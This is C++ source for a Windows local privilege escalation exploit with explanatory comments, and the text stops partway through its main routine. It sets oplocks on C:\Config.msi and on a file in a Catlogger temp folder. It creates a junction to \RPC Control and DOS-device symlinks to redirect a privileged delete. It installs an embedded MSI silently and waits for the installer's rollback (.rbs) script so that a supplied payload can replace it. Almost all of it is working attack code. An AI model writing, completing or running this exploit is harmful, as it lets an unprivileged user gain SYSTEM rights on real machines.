#include <Windows.h> // Include Windows-specific headers for API functions
#include <Shlwapi.h> // Provides functions for path manipulation
#include <Msi.h> // Functions for interacting with Windows Installer
#include <PathCch.h> // Path manipulation utilities
#include <AclAPI.h> // Functions for handling access control lists
#include <iostream> // Include for I/O stream operations
#include "resource.h" // Include for resource handling
#include "def.h" // Definitions specific to this application
#include "FileOplock.h" // Oplock-related functionality
#pragma comment(lib, "Msi.lib") // Link against the MSI library
#pragma comment(lib, "Shlwapi.lib") // Link against the Shlwapi library
#pragma comment(lib, "PathCch.lib") // Link against the PathCch library
#pragma comment(lib, "rpcrt4.lib") // Link against the RPC runtime library
#pragma warning(disable:4996) // Disable deprecation warnings
/*
Summary:
This C++ code snippet demonstrates various Windows API functions related to file system manipulation,
directory and file handling, junction point creation and deletion, as well as dynamic linking and memory management.
It includes the use of Windows handles, NTSTATUS codes, and complex operations like creating oplocks and manipulating
security attributes of files and directories. The code is set up for a Windows environment, particularly focusing on
installer manipulations, symbolic link adjustments, and handling of directory changes with custom APIs and security settings.
*/
// Global variable declarations for handles and other objects
FileOpLock* oplock;
HANDLE hFile, hFile2, hFile3, hDir; // File and directory handles
HANDLE hthread; // Handle for threads
NTSTATUS retcode; // Status code used by NT-based functions
HMODULE hm = GetModuleHandle(NULL); // Handle to the current instance/module
WCHAR dir[MAX_PATH] = { 0x0 }; // Buffer for directory paths
WCHAR dir2[MAX_PATH] = { 0x0 };
WCHAR file[MAX_PATH] = { 0x0 };
WCHAR file2[MAX_PATH] = { 0x0 };
WCHAR file3[MAX_PATH] = { 0x0 };
WCHAR targetDeleteFile[MAX_PATH] = { 0x0 };
WCHAR* fileName; // Pointer to a file name string
WCHAR fullobjectpathFile[50] = L"GLOBAL\\GLOBALROOT\\RPC Control\\"; // Full path for object control

// Function prototypes/forward declarations for operations that will be used within the code
DWORD WINAPI install(void*);
BOOL Move(HANDLE hFile);
void callback();
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion);
LPWSTR  BuildPath(LPCWSTR path);
void load();
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target);
VOID Fail();
VOID cb1();
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target);
LPWSTR CreateTempDirectory();
BOOL DeleteJunction(LPCWSTR dir);
void Trigger1();

// Function for loading a file into memory, demonstrating memory mapping and file handling
BYTE* buffer_payload(HANDLE file, OUT size_t& r_size)
{
	HANDLE mapping = CreateFileMapping(file, 0, PAGE_READONLY, 0, 0, 0); // Create a file mapping object
	if (!mapping) {
		std::cerr << "[X] Could not create mapping!" << std::endl;
		CloseHandle(file);
		return nullptr;
	}
	BYTE* rawData = (BYTE*)MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0); // Map a view of the file into the process's address space
	if (rawData == nullptr) {
		std::cerr << "[X] Could not map view of file" << std::endl;
		CloseHandle(mapping);
		CloseHandle(file);
		return nullptr;
	}
	r_size = GetFileSize(file, 0); // Get the size of the file
	BYTE* localCopyAddress = (BYTE*)VirtualAlloc(NULL, r_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocate memory for the file's contents
	if (localCopyAddress == NULL) {
		std::cerr << "Could not allocate memory in the current process" << std::endl;
		return nullptr;
	}
	memcpy(localCopyAddress, rawData, r_size); // Copy the contents from the mapped file to the newly allocated memory
	UnmapViewOfFile(rawData); // Unmap the file view
	CloseHandle(mapping); // Close the file mapping object
	return localCopyAddress; // Return the pointer to the copied data
}

// Function to install a software package via the Windows Installer service
DWORD WINAPI install(void*) {
	HMODULE hm = GetModuleHandle(NULL); // Retrieve a handle to the loaded module of the calling process

	HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_MSI1), L"msi"); // Locate the MSI resource in the module
	wchar_t msipackage[MAX_PATH] = { 0x0 }; // Buffer for the MSI package path
	GetTempFileName(L"C:\\windows\\temp\\", L"MSI", 0, msipackage); // Generate a temporary filename for the MSI package
	printf("[*] MSI file: %ls\n", msipackage); // Log the path of the MSI file
	DWORD MsiSize = SizeofResource(hm, res); // Get the size of the MSI resource
	void* MsiBuff = LoadResource(hm, res); // Load the MSI resource into memory

	HANDLE pkg = CreateFile(msipackage, GENERIC_WRITE | WRITE_DAC, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(pkg, MsiBuff, MsiSize, NULL, NULL); // Write the MSI data to the file
	CloseHandle(pkg); // Close the file handle after writing
	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL); // Set the UI level for installation to none
	UINT a = MsiInstallProduct(msipackage, L"ACTION=INSTALL"); // Install the product
	if (a != ERROR_SUCCESS) {
		printf("[!] MSI installation failed with error code %d!\n", a); // Log failure
		return FALSE;
	}
	printf("[!] MSI installation successfully\n"); // Log success

	MsiInstallProduct(msipackage, L"REMOVE=ALL"); // Remove the installed product
	DeleteFile(msipackage); // Delete the temporary MSI file
	return 0; // Return success
}

// Function to move a file to a new location using a UUID for the filename
BOOL Move(HANDLE hFile) {
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] Invalid handle!\n"); // Log an error if the file handle is invalid
		return FALSE;
	}
	wchar_t tmpfile[MAX_PATH] = { 0x0 }; // Buffer for the new file path
	RPC_WSTR str_uuid; // Buffer for the string representation of the UUID
	UUID uuid = { 0 };
	UuidCreate(&uuid); // Generate a UUID
	UuidToString(&uuid, &str_uuid); // Convert the UUID to a string
	_swprintf(tmpfile, L"\\??\\C:\\windows\\temp\\%s", str_uuid); // Format the new file path with the UUID
	size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t)); // Calculate the size needed for the rename operation
	FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz); // Allocate memory for the rename info
	IO_STATUS_BLOCK io = { 0 };
	rename_info->ReplaceIfExists = TRUE; // Set to replace the file if it exists
	rename_info->RootDirectory = NULL;
	rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
	rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
	memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t)); // Copy the new path to the rename info
	NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65); // Perform the rename operation
	if (status != 0) {
		return FALSE; // Return failure if the rename failed
	}
	return TRUE; // Return success
}

// Callback function triggered by an oplock   - related to config.msi
void callback() {
	printf("[+] Oplock triggered on C:\\Config.msi!\n"); // Log that the oplock was triggered

	SetThreadPriority(GetCurrentThread(), REALTIME_PRIORITY_CLASS); // Increase the thread priority
	Move(hFile); // Move the file that triggered the oplock
	printf("[+] C:\\Config.msi moved!\n"); // Log the successful move

	// Create a thread to invoke the Windows Installer to install the MSI package
	printf("[+] Create thread to invoke the Windows Installer service to install our .msi\n");
	hthread = CreateThread(NULL, NULL, install, NULL, NULL, NULL); // Create the installation thread
	HANDLE hd;

	// Loop until the directory is found
	do {
		hd = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);
	} while (!hd);
	CloseHandle(hd);
	do {
		CloseHandle(hd);
		hd = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);
	} while (hd);
	CloseHandle(hd);
	do {
		hd = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);
		CloseHandle(hd);
	} while (retcode != 0xC0000022);
	printf("[+] C:\\Config.msi created\n");
}

// Function to create a directory with specific access rights, sharing mode, and disposition options
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion) {
	UNICODE_STRING ufile; // Structure used to store Unicode strings in NT functions
	HANDLE hDir; // Handle for the directory that will be created or opened
	pRtlInitUnicodeString(&ufile, file); // Initializes a UNICODE_STRING with the specified path
	OBJECT_ATTRIBUTES oa = { 0 }; // Structure that contains attributes for objects managed by NT functions
	IO_STATUS_BLOCK io = { 0 }; // Structure used to return status information about I/O operations
	InitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL); // Initializes the structure with the specified attributes

	retcode = pNtCreateFile(&hDir, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL); // Creates or opens a file or directory object
	if (!NT_SUCCESS(retcode)) { // Checks if the operation was unsuccessful
		return NULL; // Returns NULL if the operation failed
	}
	return hDir; // Returns the handle to the directory
}

// Function to build a full NT-style path from a given normal path
LPWSTR BuildPath(LPCWSTR path) {
	wchar_t ntpath[MAX_PATH]; // Buffer to store the NT path
	swprintf(ntpath, L"\\??\\%s", path); // Formats the given path into an NT path
	return ntpath; // Returns the NT path
}

// Function to load necessary libraries and function addresses from NTDLL
void load() {
	HMODULE ntdll = LoadLibraryW(L"ntdll.dll"); // Loads the NTDLL library which contains NT level functions
	if (ntdll != NULL) {
		pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString"); // Retrieves the address of the RtlInitUnicodeString function
		pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile"); // Retrieves the address of the NtCreateFile function
		pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile"); // Retrieves the address of the NtSetInformationFile function
	}
	if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) {
		printf("Cannot load APIs %d\n", GetLastError()); // Logs an error if any of the function addresses could not be loaded
		exit(0); // Exits the program if critical functions are not available
	}
}

// Function to create a junction point from one directory to another
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target) {
	HANDLE hJunction;
	DWORD cb;
	wchar_t printname[] = L""; // Empty string for the print name of the junction
	HANDLE hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL); // Opens the target directory with the required privileges to modify its attributes

	if (hDir == INVALID_HANDLE_VALUE) { // Check if the handle is valid
		printf("[!] Failed to obtain handle on directory %ls\n", dir); // Logs an error message with the directory path
		return FALSE;
	}

	SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR); // Calculate the length of the target path
	SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR); // Calculate the length of the print name
	SIZE_T PathLen = TargetLen + PrintnameLen + 12; // Total path length including extra space for null termination and alignment
	SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)); // Calculate the total size of the data buffer needed
	PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize); // Allocate memory for the reparse data buffer
	Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT; // Set the reparse point tag to a mount point
	Data->ReparseDataLength = PathLen; // Set the data length of the reparse data
	Data->Reserved = 0; // Reserved field, set to zero
	Data->MountPointReparseBuffer.SubstituteNameOffset = 0; // Offset to the substitute name
	Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen; // Length of the substitute name
	memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2); // Copy the target path to the buffer
	Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2); // Offset to the print name
	Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen; // Length of the print name
	memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2); // Copy the print name to the buffer

	if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0) {
		printf("[+] Junction %ls -> %ls created!\n", dir, target); // Logs success message
		free(Data); // Frees the allocated buffer
		return TRUE;
	}
	else {
		printf("[!] Error on creating junction %ls -> %ls : Error code %d\n", dir, target, GetLastError()); // Logs error message with error code
		free(Data); // Frees the allocated buffer
		return FALSE;
	}
}

// Function to delete a junction point from a given directory path
BOOL DeleteJunction(LPCWSTR path) {
	REPARSE_GUID_DATA_BUFFER buffer = { 0 };  // Initializes a buffer to manage reparse point data.
	BOOL ret;  // Variable to capture the return status of DeviceIoControl function.
	buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;  // Sets the reparse tag to a mount point, identifying the type of reparse point.
	DWORD cb = 0;  // Variable to store the number of bytes returned by DeviceIoControl.
	IO_STATUS_BLOCK io;  // Structure that receives the final completion status and information about the operation.

	// Opens a handle to the directory with the reparse point, with permissions to write attributes.
	HANDLE hDir = CreateFile(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_OPEN_REPARSE_POINT, NULL);
	// Check if the handle is valid.
	if (hDir == INVALID_HANDLE_VALUE) {
		// Print an error message if failed to open the directory handle.
		printf("[!] Failed to obtain handle on directory %ls, Error: %d\n", path, GetLastError());
		return FALSE;  // Return FALSE indicating the operation failed.
	}
	// Attempt to delete the reparse point using DeviceIoControl.
	ret = DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL);
	if (ret == 0) {
		// If DeviceIoControl fails, print an error message with the error code.
		printf("[!] DeviceIoControl Error: %d\n", GetLastError());
		return FALSE;  // Return FALSE indicating the operation failed.
	}
	else {
		// Otherwise, print a success message.
		printf("[+] Junction %ls deleted!\n", path);
		return TRUE;  // Return TRUE indicating the operation succeeded.
	}
}

// Function to create a symbolic link in the DOS device namespace
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	// Attempts to create a symbolic link named 'object' that points to 'target'.
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
		// If successful, print a success message.
		printf("[+] Symlink %ls -> %ls created!\n", object, target);
		return TRUE;  // Return TRUE indicating success.
	}
	else {
		// If not successful, print an error message displaying the last error code.
		printf("[!] Error in creating Symlink : %d\n", GetLastError());
		return FALSE;  // Return FALSE indicating failure.
	}
}

// Function to delete a symbolic link in the DOS device namespace
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	// Attempts to delete a symbolic link named 'object' that points to 'target'.
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
		// If successful, print a success message.
		printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
		return TRUE;  // Return TRUE indicating success.
	}
	else {
		// If not successful, print an error message displaying the last error code.
		printf("[!] Error in deleting Symlink : %d\n", GetLastError());
		return FALSE;  // Return FALSE indicating failure.
	}
}

// Function to deny create permissions for a specific directory
void DenyCreatePermissions(LPWSTR dirPath) {
	PACL pOldDACL = NULL, pNewDACL = NULL;
	PSECURITY_DESCRIPTOR pSD = NULL;
	EXPLICIT_ACCESS eaAccess;

	// Allocate and copy "Everyone" into a non-const wide string
	LPWSTR everyone = (LPWSTR)malloc(8 * sizeof(WCHAR));
	wcscpy(everyone, L"Everyone");

	// Get a pointer to the existing DACL.
	DWORD dwRes = GetNamedSecurityInfo(dirPath, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDACL, NULL, &pSD);
	if (ERROR_SUCCESS != dwRes) {
		printf("GetNamedSecurityInfo Error %u\n", dwRes);
		goto Cleanup;
	}

	// Initialize an EXPLICIT_ACCESS structure for the new ACE.
	ZeroMemory(&eaAccess, sizeof(EXPLICIT_ACCESS));
	eaAccess.grfAccessPermissions = FILE_ADD_FILE | FILE_ADD_SUBDIRECTORY;
	eaAccess.grfAccessMode = DENY_ACCESS;
	eaAccess.grfInheritance = CONTAINER_INHERIT_ACE | OBJECT_INHERIT_ACE;
	eaAccess.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
	eaAccess.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	eaAccess.Trustee.ptstrName = everyone;

	// Create a new ACL that merges the new DENY ACE into the existing DACL.
	dwRes = SetEntriesInAcl(1, &eaAccess, pOldDACL, &pNewDACL);
	if (ERROR_SUCCESS != dwRes) {
		printf("SetEntriesInAcl Error %u\n", dwRes);
		goto Cleanup;
	}

	// Attach the new ACL as the object's DACL.
	dwRes = SetNamedSecurityInfo(dirPath, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDACL, NULL);
	if (ERROR_SUCCESS != dwRes) {
		printf("SetNamedSecurityInfo Error %u\n", dwRes);
		goto Cleanup;
	}

Cleanup:
	if (pSD != NULL)
		LocalFree((HLOCAL)pSD);
	if (pNewDACL != NULL)
		LocalFree((HLOCAL)pNewDACL);
	if (everyone != NULL)
		free(everyone);
}

/* 
This function is designed to move all files from the Catlogger directory to a new location when the oplock is triggered, effectively "emptying" the directory. 
This allows a junction to be created from Catlogger to \\RPC Control. 
1.	It logs that the oplock was triggered on the file.
2.	It creates a new thread that runs the Fail function. The Fail function is not provided, so I can't tell what it does.
3.	It attempts to move the file that triggered the oplock (kissa.txt) using the Move function. If the move fails, it logs an error and exits the program. If the move is successful, it logs a success message.
4.	It then initializes a file search in the Catlogger directory. If the search fails, it logs an error and exits the program.
5.	It loops through all files in the Catlogger directory. For each file, it opens the file with read and delete permissions and attempts to move the file using the Move function. It keeps trying to move the file until the move is successful. Once the file is successfully moved, it logs a success message.
6.	After all files in the Catlogger directory have been moved, it attempts to create a junction point from the Catlogger directory to the \\RPC Control target using the CreateJunction function. If the junction creation fails, it logs an error and exits the program.
7.	It appends the name of the file that triggered the oplock (kissa.txt) to the fullobjectpathFile string, which is initially set to GLOBAL\\GLOBALROOT\\RPC Control\\.
8.	It attempts to create a symbolic link from the fullobjectpathFile string to the targetDeleteFile string using the DosDeviceSymLink function. If the symbolic link creation fails, it logs an error and exits the program.
*/
VOID cb1() {
	
	// Log that the oplock was triggered on the file.
	printf("[+] Oplock triggered on %ls!\n", file);

	// Create a new thread that runs the Fail function.
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Fail, NULL, 0, NULL);
	
	// Try to move the file. If the move fails, log an error and exit the program.
	if (!Move(hFile2)) {
		printf("[!] Failed to move file %ls!\n", file);
		exit(1);
	}

	// Log that the file was successfully moved.
	printf("[+] File %ls moved!\n", file);
	
	// Initialize variables for file searching.
	WIN32_FIND_DATA ffd;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// Prepare the directory path for file searching.
	_swprintf(dir2, L"%ls\\*", dir);

	// Start searching for files in the directory.
	hFind = FindFirstFile(dir2, &ffd);
	if (hFind == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to search file in %ls!\n", dir2);
		exit(1);
	}

	// Loop through all files in the directory.
	do
	{
		// If the file is a directory, skip it.
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			continue;
		}

		// Prepare the full path of the file.
		_swprintf(file3, L"%ls\\%ls", dir, ffd.cFileName);

		// Open the file with read and delete permissions.
		do {
			hFile3 = CreateFile(file3, GENERIC_READ | DELETE, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		} while (hFile3 == INVALID_HANDLE_VALUE);

		// Move the file. Keep trying until the move is successful.
		while (!Move(hFile3)) {}

		// Log that the file was successfully moved.
		printf("[+] %ls moved!\n", file3);
	} while (FindNextFile(hFind, &ffd) != 0);

	// Create a junction point from the directory to the "\\RPC Control" target.
	if (!CreateJunction(BuildPath(dir), L"\\RPC Control")) {
		printf("[!] Failed to create junction! Exiting!\n");
		exit(1);
	}

	// Append the file name to the object control path.
	wcscat(fullobjectpathFile, fileName);

	// Create a symbolic link from the object control path to the target delete file.
	if (!DosDeviceSymLink(fullobjectpathFile, targetDeleteFile)) {
		printf("[!] Failed to create symlink! Exiting!\n");
		exit(1);
	}
}

// Function to create a temporary directory and return the path to a specific file within it
LPWSTR CreateTempDirectory() {
	wchar_t wcharPath[MAX_PATH]; // Buffer to store the temporary path

	// Attempt to retrieve the path to the temporary folder for the system or current user
	if (!GetTempPathW(MAX_PATH, wcharPath)) {
		printf("failed to get temp path"); // Log error if the temporary path cannot be retrieved
		return NULL; // Return NULL indicating failure
	}

	printf("[+] Folder %ls created!\n", dir); // Log success (this is misleading as no folder is created here)
	_swprintf(file, L"%s\\12345.txt", dir); // Format the full path to a file named "12345.txt" in the temporary directory

	// Create or open a directory with specific access and disposition
	HANDLE hDir = myCreateDirectory(BuildPath(dir), GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF);
	if (hDir == NULL) {
		printf("Error on directory creation"); // Log error if directory creation fails
		return NULL; // Return NULL indicating failure
	}

	return file; // Return the path to the file
}

// Function that initiates monitoring of a specific directory for file creation
void Trigger1() {
	//This is the folder where the file will be created
	_swprintf(dir, L"C:\\Users\\%ls\\AppData\\Local\\Temp\\Catlogger\\", _wgetenv(L"USERNAME")); // Build the directory path using environment variables

	// Deny create permissions for the directory
	DenyCreatePermissions(dir);

	// Attempt to create the file with weak dack and open the directory until successful
	do {
		hDir = myCreateDirectory(BuildPath(dir), GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF);
	} while (!hDir);
	printf("[+] Directory %ls created with weak DACL\n", dir); // Log the creation of the directory with specific security settings

	char buff[4096]; // Buffer to store directory change notifications
	DWORD retbt = 0; // Variable to store the number of bytes returned by ReadDirectoryChangesW
	FILE_NOTIFY_INFORMATION* fn; // Pointer to the file notification information
	WCHAR* extension2; // Pointer to store file extension
	printf("[+] Waits for process to create an kissa.txt file\n"); // Log that the system is waiting for a .txt file to be created
	do {
		// Monitor directory changes, specifically looking for file creation
		ReadDirectoryChangesW(hDir, buff, sizeof(buff) - sizeof(WCHAR), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME,
			&retbt, NULL, NULL);
		fn = (FILE_NOTIFY_INFORMATION*)buff; // Cast the buffer to FILE_NOTIFY_INFORMATION
		size_t sz = fn->FileNameLength / sizeof(WCHAR); // Calculate the length of the filename
		fn->FileName[sz] = '\0'; // Null-terminate the filename
		fileName = fn->FileName; // Assign the filename
		PathCchFindExtension(fileName, MAX_PATH, &extension2); // Find the file extension
	} while (wcscmp(fileName, L"kissa.txt") != 0); // Continue until a file found
	//while (wcscmp(extension2, L".out") != 0); // Continue until a file with .out extension is found
	_swprintf(file, L"%ls\\%ls", dir, fileName); // Format the full path to the file
	printf("[+] File %ls created!!\n", file); // Log the creation of the file

	FileOpLock* oplock;

	// Create or open the file repeatedly until successful
	do {
		hFile2 = CreateFile(file, GENERIC_READ | DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
	} while (hFile2 == INVALID_HANDLE_VALUE);

	printf("[+] Create OpLock on %ls!\n", file); // Log the creation of an oplock on the file
	printf("[*] Ready! Trigger the vulnerability\n"); // Prompt to trigger the vulnerability
	printf("[*] Or for testing purposes, execute \"del %ls\" as admin or SYSTEM\n", file); // Suggest deletion for testing

	// Create an oplock and wait indefinitely for it to be triggered
	oplock = FileOpLock::CreateLock(hFile2, cb1);
	if (oplock != nullptr) {
		oplock->WaitForLock(INFINITE);
		delete oplock; // Delete the oplock object after it is released
	}
	printf("[+] OpLock released on %ls!\n", file); // Log the release of the oplock
}

// This function is designed to handle failure conditions, specifically for scenarios involving race conditions.
VOID Fail() {
	// Pause the execution of the current thread for 5000 milliseconds (5 seconds) to delay the response.
	Sleep(5000);
	// An alternative longer sleep comment is provided but not activated. If needed, uncomment the next line for a 50-second delay.
	//Sleep(50000);

	// Outputs a message indicating that a race condition check has failed.
	printf("[!] Race condtion failed!\n");

	// Attempts to delete a previously created junction point. This function handles the cleanup part of the operation.
	DeleteJunction(dir);

	// Attempts to delete a symbolic link (symlink) that was created earlier, specified by `fullobjectpathFile` and `targetDeleteFile`.
	DelDosDeviceSymLink(fullobjectpathFile, targetDeleteFile);

	// Exits the program with a status code of 1, indicating an error condition or failure.
	exit(1);
}

// Function to execute a provided payload and handle directory operations for rollback script manipulation.
void PE(wchar_t* payloadPath, void (*Trigger)(void)) {

	size_t RbsSize = 0; // Variable to hold the size of the payload data.
	// Open the payload file for reading.
	HANDLE hRbs = CreateFile(payloadPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	// Read the payload into a buffer.
	BYTE* RbsBuff = buffer_payload(hRbs, RbsSize);
	// Close the handle to the payload file.
	CloseHandle(hRbs);

	// Attempt to create or open a directory specifically for configuration management.
	hFile = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF);
	// Check if the directory handle is invalid.
	if (hFile == INVALID_HANDLE_VALUE)
	{
		// Log failure and attempt to delete the directory to try again.
		printf("[!] Failed to create C:\\Config.msi directory. Trying to delete it.\n");
		install(NULL); // Attempt to clean up or reinstall necessary components.
		// Try to create or open the directory again.
		hFile = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF);
		// Check if the directory handle is now valid.
		if (hFile != INVALID_HANDLE_VALUE)
		{
			// Log successful recreation of the directory.
			printf("[+] Successfully removed and recreated C:\\Config.Msi.\n");
		}
		else
		{
			// Log failure to recreate the directory and exit the function.
			printf("[!] Failed. Cannot remove c:\\Config.msi");
			return;
		}
	}
	// Check if the directory is not empty.
	if (!PathIsDirectoryEmpty(L"C:\\Config.Msi"))
	{
		// Log that the directory exists and is not empty, then exit the function.
		printf("[!] Failed.  C:\\Config.Msi already exists and is not empty.\n");
		return;
	}

	// Log the successful creation of the directory.
	printf("[+] Config.msi directory created!\n");
	// Create a new thread to run the provided Trigger function.
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Trigger, NULL, NULL, NULL);

	// Set the current process to a high priority class.
	SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
	// Disable thread priority boosting.
	SetThreadPriorityBoost(GetCurrentThread(), TRUE);
	// Set the thread's priority to time-critical.
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

	// Log that an OpLock is being created on the directory to monitor changes.
	printf("[+] Create OpLock on C:\\Config.msi!\n");
	// Create an OpLock and wait indefinitely until it's triggered.
	oplock = FileOpLock::CreateLock(hFile, callback);
	if (oplock != nullptr) {
		oplock->WaitForLock(INFINITE);
		// Delete the oplock after it's released.
		delete oplock;
	}
	// Log the release of the OpLock.
	printf("[+] OpLock released on C:\\Config.msi!\n");

	// Continuously attempt to create the directory with weak DACL until successful.
	do {
		hFile = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF);
	} while (!hFile);
	// Log the successful creation of the directory with weak DACL.
	printf("[+] C:\\Config.msi created with weak DACL\n");

	// Prepare to monitor for .rbs file creation by the Windows Installer.
	char buff[4096];
	DWORD retbt = 0;
	FILE_NOTIFY_INFORMATION* fn;
	WCHAR* fileName;
	WCHAR* extension2;
	printf("[+] Waits for Windows Installer to create an .rbs file\n");
	do {
		// Monitor directory changes and check for .rbs file creation.
		ReadDirectoryChangesW(hFile, buff, sizeof(buff) - sizeof(WCHAR), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME,
			&retbt, NULL, NULL);
		fn = (FILE_NOTIFY_INFORMATION*)buff;
		size_t sz = fn->FileNameLength / sizeof(WCHAR);
		fn->FileName[sz] = '\0'; // Ensure the file name is null-terminated.
		fileName = fn->FileName;
		PathCchFindExtension(fileName, MAX_PATH, &extension2);
	} while (wcscmp(extension2, L".rbs") != 0); // Continue until an .rbs file is found.

	// Set security information for the directory to have a weak DACL.
	SetSecurityInfo(hFile, SE_FILE_OBJECT, UNPROTECTED_DACL_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL);
	// Log the setting of weak DACL for the directory.
	printf("[+] C:\\Config.msi was set with weak DACL\n");

	// Wait until the directory is successfully moved.
	while (!Move(hFile)) {
	}
	// Log the successful move of the directory.
	printf("[+] C:\\Config.msi moved!\n");

	// Create or open the directory again, this time to handle data files.
	HANDLE cfg_h = myCreateDirectory(BuildPath(L"C:\\Config.msi"), FILE_READ_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE);
	// Log the creation of the directory handle.
	printf("[+] C:\\Config.msi created!\n");

	// Build the path to the .rbs file and open it for writing.
	WCHAR rbsfile[MAX_PATH];
	_swprintf(rbsfile, L"C:\\Config.msi\\%s", fn->FileName);
